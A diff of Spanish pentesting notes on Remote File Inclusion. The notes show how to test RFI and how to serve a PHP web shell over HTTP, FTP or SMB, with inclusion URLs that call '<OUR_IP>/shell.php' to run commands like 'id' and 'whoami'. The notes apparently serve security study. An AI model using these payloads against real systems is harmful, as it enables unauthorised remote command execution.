@@ -58,16 +58,19 @@ En algunos casos los servidores pueden tener instalado el filtro expect que perm
 
 
 
-#########################################RFI
+### RFI
 
 Una buena forma de probar RFI es inducando un servicio interno, como por ejemplo "http:127.0.0.1:80/index.php". De esta manera
 si el RFI es posible, cargará la página principal en el espacio debido.
 
 Luego podemos levantar distintos tipos de servidores donde alijamos una shell php.
 
-http:  sudo python3 -m http.server <LISTENING_PORT> (http://<OUR_IP>/shell.php&cmd=id)
-ftp: sudo python -m pyftpdlib -p 21 (ftp://<OUR_IP>/shell.php&cmd=id)
-smb: impacket-smbserver -smb2support share $(pwd) (este se usaría: \\<OUR_IP>\share\shell.php&cmd=whoami)
+##### Http:
+                sudo python3 -m http.server <LISTENING_PORT> (http://<OUR_IP>/shell.php&cmd=id)
+##### FTP
+                sudo python -m pyftpdlib -p 21 (ftp://<OUR_IP>/shell.php&cmd=id)
+##### SMB
+                impacket-smbserver -smb2support share $(pwd) (este se usaría: \\<OUR_IP>\share\shell.php&cmd=whoami)
 
 
 ########################fileuploads
